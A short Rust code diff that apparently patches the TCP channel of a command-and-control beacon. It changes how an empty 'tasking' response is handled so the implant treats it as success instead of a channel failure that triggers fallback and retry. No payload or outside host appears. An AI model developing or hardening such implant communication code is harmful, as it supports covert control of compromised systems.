@@ -542,8 +542,12 @@ unsafe fn tcp_exchange(
     // Guard: a malicious/buggy peer could claim a huge length to exhaust the
     // bump allocator. Cap at MAX_RESPONSE_BYTES (16 MiB) and reject otherwise.
     if resp_len == 0 {
-        // Legitimate empty response — no body to read. Treat as "no tasking".
-        return None;
+        // Legitimate empty response — no body to read. "No tasking" sentinel:
+        // return Some(empty) so the beacon treats the round-trip as SUCCESS
+        // (counter advances, pending batch clears) rather than None, which
+        // reads as a channel failure and triggers a fallback switch + batch
+        // retry. An empty body parses as "no tasks" in beacon_dispatch_tasks.
+        return Some(Vec::new());
     }
     if resp_len > MAX_RESPONSE_BYTES {
         crate::entry::diag_mark(b"ERR_CH_TCP_HUGERESP");
